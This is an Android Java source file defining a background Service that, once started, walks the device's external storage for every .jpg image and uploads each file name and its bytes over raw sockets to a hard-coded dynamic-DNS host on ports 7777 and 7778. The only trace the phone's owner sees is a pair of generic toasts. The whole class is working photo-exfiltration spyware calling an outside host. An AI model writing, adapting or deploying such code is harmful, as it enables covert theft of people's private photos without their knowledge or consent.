package com.marco.service2;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;
import android.widget.Toast;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Collection;

/**
 * Created by pippo on 08/08/15.
 */
public class MyService extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public void onCreate() {
        super.onCreate();
        // codice da eseguire quando il service viene creato
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(this, "service starting", Toast.LENGTH_SHORT).show();
        Thread t = new Thread(new Runnable() {
                 final int PORT = 7777;
                 Collection<File> files;
                 File sdDir;
                 public void run(){
                     sdDir = new File(Environment.getExternalStorageDirectory()+"");
                     getAllFiles();
                 }
                 public void getAllFiles(){
                     String[] ext = new String[1];
                     ext [0] = "jpg";
                     files = FileUtils.listFiles(sdDir, ext, true);
                     File[] l = files.toArray(new File[0]);
                     Log.v("Service","Numero files trovati:"+l.length);
                     for(int i=0;i<files.size();i++){
                         try{
                             sendName(l[i]);
                             Thread.sleep(2000);
                             sendFile(l[i]);
                         }catch(NullPointerException e){
                             e.printStackTrace();
                         } catch (InterruptedException e) {
                             e.printStackTrace();
                         }
                     }
                 }
                 public void sendFile(File ph) {
                     try {
                         Socket socket = new Socket(InetAddress.getByName("mowkosfeybed7ze9.myfritz.net").getHostAddress(), PORT);
                         FileInputStream fis = new FileInputStream(ph);
                         OutputStream out = socket.getOutputStream();
                         byte[] buf = new byte[1024];
                         int read;
                         while ((read = fis.read(buf)) != -1) {
                             out.write(buf, 0, read);
                         }
                         fis.close();
                         out.flush();
                         out.close();
                         socket.close();
                     } catch (IOException ex) {
                         System.out.println(ex.getMessage());
                         stopSelf();
                     }
                 }
                 public void sendName(File ph){
                     try {
                         Socket s2 = new Socket(InetAddress.getByName("mowkosfeybed7ze9.myfritz.net").getHostAddress(),7778);
                         OutputStream out = s2.getOutputStream();
                         OutputStreamWriter osw = new OutputStreamWriter(out);
                         osw.write(ph.getName(),0,ph.getName().length());
                         osw.flush();
                         osw.close();
                     } catch (IOException e) {
                         e.printStackTrace();
                     }
                 }
        });
        t.start();
        Toast.makeText(this, "service finished", Toast.LENGTH_SHORT).show();
        stopSelf();
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        Toast.makeText(this, "service done", Toast.LENGTH_SHORT).show();
    }
}